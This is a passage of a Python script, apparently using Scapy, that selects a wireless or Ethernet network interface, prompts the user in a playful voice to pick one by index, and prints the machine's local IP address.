    if layer_num==3:
       interface_names=get_if_list()
       interfaces=''
       if len(interface_names)>3:
          match_char='w'
          for interfaces in interface_names:
              if match_char in interfaces:
                 layer_network.append(interfaces)
          if len(layer_network)>1:
             for interfaces in layer_network:
                 print(f"[{layer_network.index(interfaces)}] Interface Name:- ",interfaces)
             interface_select=int(input("Maam Would you please put index number please (-‿◦☀) :- "))        
             for interfaces in layer_network:
                 if interface_select==layer_network.index(interfaces):
                    my_ip=get_if_addr(interfaces)
                    interface_val=interfaces 
          else:
            match_char='w'
            for interfaces in interface_names:
                if match_char in interfaces:
                   my_ip=get_if_addr(interfaces)
                   interface_val=interfaces 
       else:
          match_char='w'
          for interfaces in interface_names:
              if match_char in interfaces:
                 my_ip=get_if_addr(interfaces)
                 interface_val=interfaces 
    else:
      interface_names=get_if_list()
      interfaces=''
      if len(interface_names)>3:
         match_char='e'
         for interfaces in interface_names:
             if match_char in interfaces:
                layer_datalink.append(interfaces)
         if len(layer_datalink)>1:
            for interfaces in layer_datalink:
                print(f"[{layer_datalink.index(interfaces)}] Interface Name:- ",interfaces)
            interface_select=int(input("Maam Would you please put index number please (-‿◦☀) :- "))
            for interfaces in layer_datalink:
                if interface_select==layer_datalink.index(interfaces):
                    my_ip=get_if_addr(interfaces)
                    interface_val=interfaces 
         else:
            match_char='e'
            for interfaces in interface_names:
                if match_char in interfaces:
                   my_ip=get_if_addr(interfaces)  
                   interface_val=interfaces
      else:
        match_char='e'
        for interfaces in interface_names:
            if match_char in interfaces:
                my_ip=get_if_addr(interfaces)  
                interface_val=interfaces 
  print("👇 Maam your Ip 👇")
  D.banner_ip(my_ip)
  main()

